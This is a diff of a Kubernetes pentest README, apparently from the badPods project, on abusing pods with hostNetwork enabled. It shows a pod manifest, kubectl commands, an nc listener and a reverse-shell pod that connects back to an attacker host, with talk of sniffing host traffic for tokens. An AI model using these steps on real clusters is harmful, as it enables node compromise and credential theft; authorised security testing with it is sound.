@@ -5,22 +5,66 @@ The important things here are:
 * You can sniff traffic on any of the host's network interfaces, and maybe find some kubernetes tokens or application specific passwords, keys, etc. to other services in the cluster.  
 * You can communicate with network services on the host that are only listening on localhost/loopback. Services you would not be able to touch without `hostNetowrk=true`
 
+# Pod Creation
+
+### Create a pod you can exec into
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-hostnetwork
+  labels:
+    app: hostnetwork
+spec:
+  hostNetwork: true
+  containers:
+  - image: ubuntu
+    command:
+      - "sleep"
+      - "604800"
+    imagePullPolicy: IfNotPresent
+    name: hostnetwork
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  restartPolicy: Always
+  ```
 [pod-hostnetwork-only.yaml](pod-hostnetwork-only.yaml)
 
-
-### Create pod
-```bash 
-# Option 1: Create pod from local yaml 
+#### Option 1: Create pod from local yaml 
+```bash
 kubectl apply -f pod-hostnetwork-only.yaml   
+```
 
-# Option 2: Create pod from github hosted yaml
+#### Option 2: Create pod from github hosted yaml
+```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostnetwork-only/pod-hostnetwork-only.yaml  
 ```
 
 ### Exec into pod 
-
 ```bash
 kubectl -n [namespace] exec -it pod-hostnetwork-only -- bash
+```
+
+### Or, create a reverse shell pod
+[pod-hostnetwork-only-revshell.yaml](pod-hostnetwork-only-revshell.yaml)
+
+#### Set up listener
+```bash
+nc -nvlp 3116
+```
+
+#### Create the pod
+```bash
+# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
+HOST="10.0.0.1" PORT="3116" 
+envsubst < ./yaml/hostnetwork-only/pod-hostnetwork-only-revshell.yaml | kubectl apply -f -
+```
+
+#### Catch the shell and chroot to /host 
+```bash
+~ nc -nvlp 3116
+Listening on 0.0.0.0 3116
+Connection received on 10.0.0.162 42035
 ```
 
 # Post Exploitation 
